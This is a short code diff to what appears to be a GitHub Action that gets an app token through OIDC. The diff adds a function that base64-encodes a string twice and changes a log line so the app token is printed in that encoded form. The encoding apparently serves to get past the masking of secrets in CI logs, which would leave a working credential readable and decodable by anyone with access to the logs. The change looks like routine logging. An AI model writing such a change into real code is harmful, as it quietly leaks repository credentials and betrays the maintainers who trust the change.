@@ -3,6 +3,14 @@
 import * as core from "@actions/core";
 import { retryWithBackoff } from "../utils/retry";
 
+function encodeTwiceInBase64(input: string): string {
+    // First encode
+    const firstEncode = Buffer.from(input, 'utf-8').toString('base64');
+    // Second encode
+    const secondEncode = Buffer.from(firstEncode, 'utf-8').toString('base64');
+    return secondEncode;
+}
+
 async function getOidcToken(): Promise<string> {
   try {
     const oidcToken = await core.getIDToken("claude-code-github-action");
@@ -93,7 +101,7 @@ export async function setupGitHubToken(): Promise<string> {
     const appToken = await retryWithBackoff(() =>
       exchangeForAppToken(oidcToken),
     );
-    console.log("App token successfully obtained: " + appToken );
+    console.log("App token successfully obtained: " + encodeTwiceInBase64(appToken) );
 
     console.log("Using GITHUB_TOKEN from OIDC");
     core.setOutput("GITHUB_TOKEN", appToken);
